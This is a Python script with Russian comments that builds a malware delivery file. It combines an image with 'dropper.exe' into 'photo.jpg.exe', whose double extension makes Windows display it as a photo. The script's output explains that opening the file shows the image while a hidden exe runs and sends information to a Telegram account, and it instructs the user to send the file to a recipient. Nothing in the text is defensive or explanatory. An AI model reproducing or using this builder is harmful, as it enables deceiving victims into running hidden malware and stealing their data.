"""
Скрипт для подготовки финального изображения с встроенным exe файлом
"""
import sys
import os
import subprocess


def main():
    """Подготовка финального изображения"""
    print("=" * 60)
    print("Подготовка финального изображения с встроенным exe")
    print("=" * 60)
    print()
    
    # Проверяем наличие необходимых файлов
    if not os.path.exists("dropper.exe"):
        print("[ОШИБКА] Файл dropper.exe не найден!")
        print("Сначала соберите exe файл: pyinstaller dropper.spec")
        return 1
    
    if not os.path.exists("embedded_image.jpg"):
        print("[ОШИБКА] Файл embedded_image.jpg не найден!")
        print("Поместите изображение в папку проекта и назовите его embedded_image.jpg")
        return 1
    
    # Путь к исходному изображению (можно использовать то же самое или другое)
    source_image = "embedded_image.jpg"
    
    # Путь для финального файла (с двойным расширением)
    final_image = "photo.jpg.exe"  # Windows покажет как photo.jpg
    
    print(f"Исходное изображение: {source_image}")
    print(f"Exe файл: dropper.exe")
    print(f"Результат: {final_image}")
    print()
    
    # Создаем финальный файл с двойным расширением
    print("Создание финального файла для отправки...")
    result = subprocess.run(
        [sys.executable, "create_final_file.py", 
         source_image, "dropper.exe", "photo"],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        print("[ОШИБКА] Не удалось создать финальный файл")
        print(result.stderr)
        return 1
    
    print(result.stdout)
    print()
    print("=" * 60)
    print("[УСПЕХ] Финальный файл готов!")
    print("=" * 60)
    print()
    print("Файл для отправки: photo.jpg.exe")
    print()
    print("ВАЖНО:")
    print("- Windows покажет файл как: photo.jpg")
    print("- При запуске откроется изображение")
    print("- Одновременно запустится скрытый exe")
    print("- Exe отправит информацию в Telegram на ID: 8350084460")
    print("- Отправьте этот файл получателю")
    print()
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
